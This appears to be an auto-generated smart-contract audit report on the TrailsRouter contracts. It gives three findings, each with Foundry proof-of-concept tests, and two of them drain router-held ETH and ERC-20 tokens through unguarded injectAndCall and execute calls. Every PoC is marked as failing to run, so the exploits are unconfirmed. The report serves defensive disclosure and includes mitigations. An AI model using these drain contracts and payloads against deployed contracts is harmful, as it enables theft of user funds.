### Finding Severity Justification: injectAndCall is publicly callable without the onlyDelegatecall guard, yet it operates on address(this) balances. Any EOA can 1) forward all ETH held by the router to an arbitrary target, and 2) for ERC-20s, set unlimited approval to a caller-controlled target and trigger transferFrom (or simply call token.transfer) to drain all tokens from the router. This enables direct theft of real user assets that may reside on the router due to legitimate standalone flows (pullAmountAndExecute/injectSweepAndCall) or accidental/native sends. Impact is direct loss of funds; exploit requires no special privileges.
## Derived From Pattern/Invariant
Public injectAndCall/execute let anyone drain router’s own ETH/ERC20 balances

## Exploit Type
AuthByPass

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
injectAndCall is meant to be used under delegatecall (wallet context) but is publicly callable with no onlyDelegatecall/auth guard. It reads address(this) balance and then spends it toward an arbitrary target picked by the caller. For ETH, it forwards the full router ETH balance. For ERC20, it grants a fresh allowance equal to the router’s full token balance to the caller-controlled target, which can immediately transferFrom the router. Vulnerable paths: 

- TrailsRouter.injectAndCall(...):
  uint256 callerBalance = _getSelfBalance(token);
  _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);

- TrailsRouter._injectAndExecuteCall(...):
  if (token == address(0)) {
      (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
  } else {
      SafeERC20.forceApprove(erc20, target, callerBalance);
      (bool success, bytes memory result) = target.call(callData);
  }

Because injectAndCall has no delegatecall/ownership checks, any EOA can: (a) drain all ETH held by the router; (b) set allowance equal to the router’s entire token balance for an attacker-controlled target and pull the tokens during the same call. Funds can land on the router via public flows (e.g., pullAmountAndExecute moving ERC20 into the router before aggregate3Value, or accidental/native sends), making those balances globally stealable.

## Impact
Direct theft of any ETH/tokens residing on the router address (leftovers from prior calls, accidental sends, or assets pulled in by public flows). Results in permanent loss of user funds that transiently reside on the router.

## Command to Run Test


## Proof of Concept
1) Victim uses pullAmountAndExecute to move tokens to the router with a benign aggregate3Value payload that doesn’t spend them (or a route that leaves residuals). 2) Attacker calls injectAndCall with token=ERC20, target=attacker contract. injectAndCall forceApproves target for the router’s full token balance and calls target. 3) Inside target, attacker calls transferFrom(msg.sender=router) to themselves for the entire approved amount. 4) For ETH: Victim calls execute with empty calls but nonzero msg.value → ETH remains on router. Attacker then calls injectAndCall(token=address(0)) to forward all router ETH to their contract and then to themselves.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TestToken is IERC20 {
    string public name = "T";
    string public symbol = "T";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        unchecked { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; }
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        unchecked {
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

// Attacker-controlled target: pulls tokens from router via freshly granted allowance
contract ERC20Drainer {
    function rug(address token, address to, uint256 amount) external {
        // msg.sender here is TrailsRouter
        IERC20(token).transferFrom(msg.sender, to, amount);
    }
}

// Receives ETH from router and forwards to attacker
contract EthForwarder {
    address payable public recipient;
    constructor(address payable r) { recipient = r; }
    function pwn() external payable {
        (bool ok,) = recipient.call{value: msg.value}("");
        require(ok, "fwd");
    }
}

contract TrailsRouter_AuthBypass_FixedPoC is Test {
    TrailsRouter router;
    TestToken token;
    address attacker;

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        attacker = address(0xA11CE);
        vm.deal(attacker, 0);
    }

    function test_DrainERC20_via_public_injectAndCall() public {
        uint256 deposit = 200 ether;
        // Seed router with ERC20 balance (simulating leftovers)
        token.mint(address(router), deposit);
        assertEq(token.balanceOf(address(router)), deposit, "seed");

        // Attacker drains via injectAndCall
        ERC20Drainer dr = new ERC20Drainer();
        bytes32 PH = keccak256("PLACEHOLDER");
        bytes memory callData = abi.encodeWithSelector(ERC20Drainer.rug.selector, address(token), attacker, uint256(PH));
        uint256 amountOffset = 4 + 32 + 32; // offset of 3rd arg

        vm.prank(attacker);
        router.injectAndCall(address(token), address(dr), callData, amountOffset, PH);

        assertEq(token.balanceOf(address(router)), 0, "router drained");
        assertEq(token.balanceOf(attacker), deposit, "attacker received tokens");
    }

    function test_DrainETH_via_public_injectAndCall() public {
        // Seed router with ETH (simulating accidental/native sends)
        vm.deal(address(router), 1 ether);
        assertEq(address(router).balance, 1 ether, "seed eth");

        EthForwarder ef = new EthForwarder(payable(attacker));
        uint256 before = attacker.balance;

        vm.prank(attacker);
        router.injectAndCall(address(0), address(ef), abi.encodeWithSelector(EthForwarder.pwn.selector), 0, bytes32(0));

        assertEq(address(router).balance, 0, "router eth drained");
        assertEq(attacker.balance, before + 1 ether, "attacker received eth");
    }
}

## Suggested Mitigation
- Add onlyDelegatecall to injectAndCall so it can only execute in the wallet context via handleSequenceDelegateCall/_injectAndCallDelegated.
- For any public, standalone entrypoints, never operate on address(this) balances; if a similar function is needed for EOAs, read from msg.sender and transfer in explicitly (as injectSweepAndCall already does).
- After ERC20 calls, clear approval back to zero to avoid lingering allowances: e.g., in the ERC20 branch of _injectAndExecuteCall, call SafeERC20.forceApprove(erc20, target, 0) after the external call.
- Consider adding a guarded recovery/sweep path (shim- or owner-scoped) for unexpected residual balances, rather than exposing a public balance-based injector.





 **Derived From** : Delegatecall storage collision makes Tstorish pick wrong branch and can brick shim

## [M-6]. Delegatecall storage collision on _tstoreSupport in TrailsRouterShim.handleSequenceDelegateCall can trigger invalid tstore and DoS on non‑1153 chains

### Finding Severity Justification: The issue enables a broad functional denial-of-service on chains without EIP-1153 support: the shim may attempt to execute the tstore opcode (invalid on those chains), causing the entire delegated execution to revert. This blocks core protocol flows but does not directly risk user assets, fitting Code4rena’s Medium: protocol function/availability impacted.
## Derived From Pattern/Invariant
Delegatecall storage collision makes Tstorish pick wrong branch and can brick shim

## Exploit Type
StorageLayout

## Location
TrailsRouterShim.handleSequenceDelegateCall

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The impact depends on two environment conditions: (1) chain lacks EIP-1153 and (2) the Sequence v3 wallet’s storage slot 0 is non-zero at runtime. While both are plausible, we cannot conclusively confirm slot 0 contents for all Sequence deployments from the provided repo. The root cause and revert path are sound, but environment specifics temper absolute confidence.
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouterShim inherits Tstorish and is always executed via delegatecall (onlyDelegatecall). Tstorish defines a non‑namespaced storage bool _tstoreSupport at slot 0 and, when the chain lacked EIP‑1153 at deploy time, assigns _setTstorish = _setTstorishWithSstoreFallback. That fallback branches on _tstoreSupport: if true it executes tstore, else sstore. Because handleSequenceDelegateCall runs under delegatecall, reading _tstoreSupport hits the CALLER (wallet) storage slot 0, not the shim’s. If the wallet’s slot 0 is non‑zero (likely), the shim will incorrectly take the tstore branch. On chains without TSTORE, the tstore opcode is invalid and the write reverts, bricking the shim path after the router call and reverting the entire operation. Even if TSTORE later becomes available, the decision in fallback is based on the caller’s slot 0 rather than a shim‑controlled flag, creating inconsistent sentinel semantics. Vulnerable snippet:

// TrailsRouterShim.handleSequenceDelegateCall
uint256 slot = TrailsSentinelLib.successSlot(opHash);
_setTstorish(slot, TrailsSentinelLib.SUCCESS_VALUE);

// Tstorish fallback
function _setTstorishWithSstoreFallback(uint256 storageSlot, uint256 value) private {
  if (_tstoreSupport) { assembly { tstore(storageSlot, value) } }
  else { assembly { sstore(storageSlot, value) } }
}

Because _tstoreSupport is read from the wallet’s slot 0 during delegatecall, a non‑zero value forces the invalid tstore path on non‑1153 chains, causing a DoS.

## Impact
Functional DoS: On non‑EIP‑1153 chains, any wallet with non‑zero slot 0 will cause the shim’s sentinel write to execute an invalid tstore opcode, reverting the delegatecall and bricking the router flow. Users cannot complete routes, and fee sweep/refund flows depending on the sentinel are blocked.

## Command to Run Test


## Proof of Concept
1) Deploy a mock router that always succeeds.
2) Deploy TrailsRouterShim pointing to that router.
3) Deploy a wallet contract with slot 0 pre‑set to a non‑zero value.
4) From the wallet, delegatecall handleSequenceDelegateCall with any opHash and inner router call that returns success.
5) On a non‑1153 environment, _setTstorishWithSstoreFallback reads the wallet’s slot 0 as true, takes the tstore path, and reverts with invalid opcode, so the delegatecall returns (ok=false).

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouterShim} from "src/TrailsRouterShim.sol";
import {TrailsSentinelLib} from "src/libraries/TrailsSentinelLib.sol";

contract MockRouter {
    event Pinged();
    function ping() external payable returns (uint256) {
        emit Pinged();
        return 1;
    }
}

contract WalletWithSlot0NonZero {
    constructor() { assembly { sstore(0, 1) } } // force non-zero caller slot 0

    function execShim(address shim, bytes32 opHash, bytes memory inner, uint256 callValue)
        external
        payable
        returns (bool ok, bytes memory ret)
    {
        bytes memory data = abi.encode(inner, callValue);
        (ok, ret) = shim.delegatecall(
            abi.encodeWithSelector(
                TrailsRouterShim.handleSequenceDelegateCall.selector,
                opHash, uint256(0), uint256(0), uint256(0), uint256(0),
                data
            )
        );
    }
}

contract TstoreProbe {
    function probe() external {
        assembly { tstore(0, 1) }
    }
}

contract StorageCollision_Tstorish_DoS_Test is Test {
    function _tstoreSupported() internal returns (bool) {
        TstoreProbe p = new TstoreProbe();
        (bool ok, ) = address(p).call(abi.encodeWithSignature("probe()"));
        return ok;
    }

    function test_DoS_on_non1153_due_to_storage_collision() public {
        // Skip if local EVM supports TSTORE; bug manifests on non-1153 chains.
        if (_tstoreSupported()) return;

        // Arrange
        MockRouter router = new MockRouter();
        TrailsRouterShim shim = new TrailsRouterShim(address(router));
        WalletWithSlot0NonZero wallet = new WalletWithSlot0NonZero();

        bytes memory inner = abi.encodeWithSelector(MockRouter.ping.selector);
        bytes32 opHash = keccak256("op");

        // Act: delegatecall into shim from wallet
        (bool ok, ) = wallet.execShim(address(shim), opHash, inner, 0);

        // Assert: delegatecall fails because _setTstorish hits invalid tstore
        assertEq(ok, false, "delegatecall should fail due to invalid tstore opcode from storage collision");
    }
}


## Suggested Mitigation
For any module intended to run under delegatecall, do not gate tstore/sstore selection using a persistent storage flag. Instead: 1) Remove the mutable _tstoreSupport variable from the shim path entirely and rely only on the constructor-time capability detection (immutables) to bind _setTstorish/_getTstorish/_clearTstorish; or 2) If post-fork activation is desired, implement a pure runtime capability probe (e.g., a cheap staticcall to a TLOAD probe) inside the fallback path and branch on that result, not on storage, so no caller storage is read. In the shim specifically, the simplest safe fix is to stop inheriting the stateful Tstorish altogether and always use sstore/sload for sentinels on non-1153 chains (decided via immutables at deployment), or use a delegatecall-safe Tstorish variant that never reads or writes persistent storage. Do not rely on EIP-7201 namespacing for this flag: it still resolves to the caller’s storage under delegatecall and remains unsafe.





 **Derived From** : execute can spend router ETH balance; public callers can drain leftover value

## [L-7]. TrailsRouter.execute allows permissionless draining of router-held ETH via delegatecall to Multicall3.aggregate3Value

### Finding Severity Justification: The issue enables draining only the TrailsRouter contract’s own ETH balance when it happens to hold funds (e.g., accidental transfers or overfunded prior calls). It does not directly put user wallets or protocol-held assets at risk under intended delegatecall-in-wallet use. Impact is limited to stray/leftover ETH on the router address and requires that such a balance exists.
## Derived From Pattern/Invariant
execute can spend router ETH balance; public callers can drain leftover value

## Exploit Type
AuthByPass

## Location
TrailsRouter.execute

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: While the technical exploit path is clear, there is some ambiguity whether the behavior is considered acceptable given the router’s stateless, delegatecall-centric design and that holding ETH on the router is unintended. This could be argued as user error or expected behavior for a standalone helper, hence SomeWhatConfident.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter.execute is permissionless and delegatecalls the canonical Multicall3.aggregate3Value. Under delegatecall, subcall value is sourced from address(this).balance (the router), not strictly from the caller’s msg.value. The router does not verify that the sum of subcall values equals msg.value of the current call, nor enforce a post-call invariant. If the router holds ETH (e.g., accidental transfers via receive(), or surplus from prior flows), any EOA can craft an aggregate3Value payload that forwards that leftover ETH to an arbitrary address with msg.value = 0.

Vulnerable snippet:
function execute(bytes calldata data) public payable returns (...) {
    _validateRouterCall(data); // only checks selector + allowFailure == false
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

Because Multicall3.aggregate3Value uses target.call{value:calls[i].value}(...), and the delegatecalled context is the router, any pre-existing ETH on the router can be siphoned by a permissionless attacker.

## Impact
A public caller can drain any native ETH and any ERC20 tokens held by the TrailsRouter contract. Because execute delegates to Multicall3.aggregate3Value, arbitrary external calls execute in the router context. An attacker can: (a) forward nonzero value subcalls to themselves, sourcing ETH from address(this).balance, and (b) invoke ERC20.transfer on token contracts with msg.sender as the router to move router-held ERC20 balances to an attacker. This extends the impact beyond leftover ETH to any ERC20 dust or overfunded balances that end up on the router address, as well as allowances the router has granted to arbitrary targets that could be abused in follow-up calls within the same aggregate.

## Command to Run Test


## Proof of Concept
Exploit steps (ETH and ERC20):
1) Preconditions: The TrailsRouter contract address holds funds: e.g., ETH accidentally sent to receive(), and/or ERC20 tokens left over from prior flows or accidental transfers.
2) Attacker crafts an aggregate3Value payload with two calls:
   - Call #1: target = attacker EOA, value = router ETH balance, callData = empty. Effect: sends all ETH from router to attacker.
   - Call #2: target = ERC20 token address, value = 0, callData = encodeWithSignature("transfer(address,uint256)", attacker, routerTokenBalance). Effect: token.transfer executes with msg.sender = router, moving all router-held tokens to attacker.
3) Attacker calls TrailsRouter.execute with msg.value = 0. Since Multicall3 runs via delegatecall, the call{value: ...} pulls ETH from router, and ERC20.transfer moves router-held tokens.
4) Result: router ETH and ERC20 balances become 0; attacker receives the drained assets.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";

contract MockMulticall3 is IMulticall3 {
    function aggregate3Value(Call3Value[] calldata calls) external payable override returns (Result[] memory out) {
        out = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool ok, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
            if (!calls[i].allowFailure) require(ok, "call-failed");
            out[i] = Result({success: ok, returnData: ret});
        }
    }
    function aggregate3(Call3[] calldata) external payable override returns (Result[] memory) {
        revert("unused");
    }
}

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 amount);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }
}

contract ExecuteDrainTest is Test {
    TrailsRouter router;
    address attacker = address(0xA11CE);
    MockERC20 token;

    function setUp() public {
        router = new TrailsRouter();
        // Install mock Multicall3 code at the canonical address used by router
        MockMulticall3 mock = new MockMulticall3();
        vm.etch(router.MULTICALL3(), address(mock).code);

        // Seed leftover ETH and ERC20 on router to simulate stray/previous funds
        vm.deal(address(router), 1 ether);
        token = new MockERC20();
        token.mint(address(router), 1_000 ether);

        vm.deal(attacker, 1 ether);
    }

    function test_execute_drains_router_eth_and_tokens() public {
        uint256 routerEthBefore = address(router).balance; // 1 ether
        uint256 attackerEthBefore = attacker.balance;
        uint256 routerTokBefore = token.balanceOf(address(router)); // 1000 ether
        uint256 attackerTokBefore = token.balanceOf(attacker);

        // Prepare aggregate3Value calldata with two calls: drain ETH, then drain ERC20
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](2);
        // 1) drain ETH to attacker
        calls[0] = IMulticall3.Call3Value({
            target: attacker,
            allowFailure: false,
            value: routerEthBefore,
            callData: ""
        });
        // 2) drain ERC20 via token.transfer(attacker, routerTokBefore)
        bytes memory transferCalldata = abi.encodeWithSignature("transfer(address,uint256)", attacker, routerTokBefore);
        calls[1] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: transferCalldata
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(attacker);
        IMulticall3.Result[] memory res = router.execute{value: 0}(data);
        assertEq(res.length, 2);

        // Assertions: router drained, attacker profited
        assertEq(address(router).balance, 0, "router ETH drained");
        assertEq(attacker.balance, attackerEthBefore + routerEthBefore, "attacker ETH gained");
        assertEq(token.balanceOf(address(router)), 0, "router tokens drained");
        assertEq(token.balanceOf(attacker), attackerTokBefore + routerTokBefore, "attacker tokens gained");
    }
}


## Suggested Mitigation
- Restrict execute (and any other delegatecall-to-Multicall entrypoints like pullAndExecute and pullAmountAndExecute) with onlyDelegatecall so they cannot be invoked on the router contract directly. This ensures calls run only in a wallet context that explicitly authorizes the operation.
- If external, standalone usage must be preserved, deploy a separate ExternalRouter and add strict safeguards that still hold under arbitrary calldata:
  • Decode Call3Value[] and enforce totalValue == msg.value and, after execution, require address(this).balance >= balanceBefore (so no pre-existing ETH was spent).
  • Additionally, external execute MUST prohibit arbitrary token movements from the router: there is no generic way to guarantee that aggregate3Value will not call ERC20.transfer/approve/etc. Therefore, either disallow token-target calls entirely in the external router, or replace aggregate3Value with a purpose-built flow that only spends tokens explicitly pulled from msg.sender in the same transaction and immediately forwards them, leaving no router-held balances. Remove receive() on the external router to reduce accidental ETH funding.
- Operationally: monitor and ensure the deployed TrailsRouter address never holds balances; if balances are observed, sweep them via a controlled delegatecall context and investigate the source to prevent recurrence.



